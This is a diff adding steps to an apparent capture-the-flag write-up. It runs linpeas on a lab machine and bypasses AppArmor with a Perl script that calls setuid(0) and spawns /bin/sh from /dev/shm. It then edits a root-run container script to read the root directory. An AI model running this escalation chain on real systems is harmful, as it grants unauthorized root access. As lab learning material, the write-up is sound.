@@ -89,3 +89,36 @@ After checking there is an unusual file /usr/sbin/run_container
 When running the container it and checking it with strings, it looks like its executing running_container script from /opt directory
 
 ![alt text](pics/ran.png)
+
+At this point I got a little lost since we do not have read permissions to /opt directory, So I deployed linpeas to the machine via scp and ran it in the /tmp directory to give us a more idea on how we can escalate our priviledge
+
+```bash
+scp -i id_rsa linpeas.sh think@10.49.143.128:/tmp/
+```
+
+```bash
+chmod +x linpeas.sh
+./tmp/linpeas.sh
+```
+
+After running linpeash, we discovered that the machine is running AppArmor which is preventing us from having access to the /opt directory.
+
+I searched on the internet and came across an old AppArmour bypass.
+
+```bash
+echo '#!/usr/bin/perl
+use POSIX qw(strftime);
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/sh"' > /dev/shm/test.pl
+chmod +x /dev/shm/test.pl
+/dev/shm/test.pl
+```
+
+It then spawned us a shell that bypasses the AppArmour restrictions. We now have access to the /opt directory
+![alt text](pics/bypass.png)
+![alt text](pics/opt.png)
+
+Now that we can edit the I added a script inside the /opt/run_container.sh that lets me read whats inside the root directory
+
+![alt text](pics/bash.png)
